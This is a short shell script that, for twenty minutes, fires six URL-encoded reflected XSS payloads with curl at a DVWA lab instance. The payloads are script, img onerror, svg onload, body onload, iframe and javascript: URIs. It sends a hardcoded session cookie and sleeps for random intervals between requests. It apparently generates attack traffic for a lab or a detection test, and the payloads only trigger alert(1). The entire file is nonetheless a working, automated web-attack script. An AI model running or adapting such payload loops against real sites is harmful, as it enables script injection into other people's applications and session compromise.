#!/bin/sh
echo "[XSS] Starting..."
COOKIE="PHPSESSID=9c05efdf8aa95ac580a1abccb31893f7; security=low"
TARGET="http://172.20.0.10/dvwa/vulnerabilities/xss_r/?name="
END=$(($(date +%s) + 1200))

while [ $(date +%s) -lt $END ]; do
    curl -s -b "$COOKIE" "${TARGET}%3Cscript%3Ealert%281%29%3C%2Fscript%3E" > /dev/null
    sleep $((RANDOM % 3 + 1))
    curl -s -b "$COOKIE" "${TARGET}%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E" > /dev/null
    sleep $((RANDOM % 3 + 1))
    curl -s -b "$COOKIE" "${TARGET}%3Csvg+onload%3Dalert%281%29%3E" > /dev/null
    sleep $((RANDOM % 3 + 1))
    curl -s -b "$COOKIE" "${TARGET}javascript%3Aalert%281%29" > /dev/null
    sleep $((RANDOM % 3 + 1))
    curl -s -b "$COOKIE" "${TARGET}%3Cbody+onload%3Dalert%281%29%3E" > /dev/null
    sleep $((RANDOM % 3 + 1))
    curl -s -b "$COOKIE" "${TARGET}%3Ciframe+src%3Djavascript%3Aalert%281%29%3E" > /dev/null
    sleep $((RANDOM % 3 + 1))
done
echo "[XSS] Done."